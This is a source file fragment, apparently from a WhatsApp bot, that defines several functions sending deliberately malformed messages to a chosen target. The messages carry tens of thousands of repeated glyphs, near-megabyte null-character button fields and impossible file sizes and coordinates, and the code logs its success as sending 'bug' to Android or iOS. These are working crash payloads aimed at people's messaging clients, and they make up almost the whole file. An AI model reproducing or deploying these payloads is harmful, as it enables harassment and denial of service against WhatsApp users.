                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function Raldz5(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "[💣] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n." + "ꦾ".repeat(27777),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(911001),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(911001),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function Raldz6(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "[👾] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "ꦽꦾ".repeat(40000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: conn.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "\u0011",
                },
                contentText: '\u0008',
                footerText: "\u0007",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(550),
                    buttonText: {
                      displayText: "\u0009",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/RaldzzXyz",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'Dracula?',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              sourceUrl: "Terawehsono",
              sourceId: "x - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: " @newsletter",
              serverMessageId: 1,
              newsletterName: `${"أ".repeat(77)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "KROCO",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await conn.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function Raldz7(target, Ptcp = true) {
    let virtex = "[☣️] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "ꦾ".repeat(90000);
    await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "\u0009".repeat(100),
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "\u0009" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
        
        async function Raldz8(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "[🩸] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "ꦽꦾ".repeat(69111)
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    },
                                    {
                                        name: "payment_method",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await conn.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("SUCCESSFULLY SEND BUG ANDROID"));
        }
     
    async function bakios1(target) {
      try {
        await conn.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "\n\n\n\n\n\n\u0000" + "ꦾ".repeat(47777),
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "ꦽꦾ".repeat(10000),
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ꦽꦾ".repeat(77),
                  body: "🦠".repeat(44),
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                  mediaUrl: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
       
async function bakios2(target, Ptcp = false) {
			await conn.relayMessage(target, {
					"extendedTextMessage": {
						"text": " 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(20000),
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6285141370204@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "💣🦠".repeat(100),
								"body": "𑇂𑆵𑆴𑆿".repeat(100),
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ.com/",
								"mediaUrl": "https://ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ.com/",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/raditx7"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};    
		
		async function bugios3(target) {
      let CrashQAiphone = "𑆵󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵".repeat(60000);
      await conn.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://youtube.com/@raldzzoffc",
          },
        },
        {
          participant: {
            jid: target
          },
        }
      );
    }
    
    		async function bugios4(target) {
			await conn.relayMessage(target, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: target
				}
			})
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};

		async function bugios5(target) {
			conn.relayMessage(target, {
				'extendedTextMessage': {
					'text': "𑆵𑆵".repeat(11000),
					'contextInfo': {
						'stanzaId': target,
						'participant': target,
						'quotedMessage': {
							'conversation': 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};


		
// Quoted		
    const glxNull = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '6285157781148@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "WTS - BOT v1.1",
                        "format": "DEFAULT",
                        "caption": "ʙʏ ʀᴀʟᴅᴢᴢ"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Alwaysaqioo@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
    
//=============== PHONIX ======================\\   
    
 async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
        
async function resetLimit() {
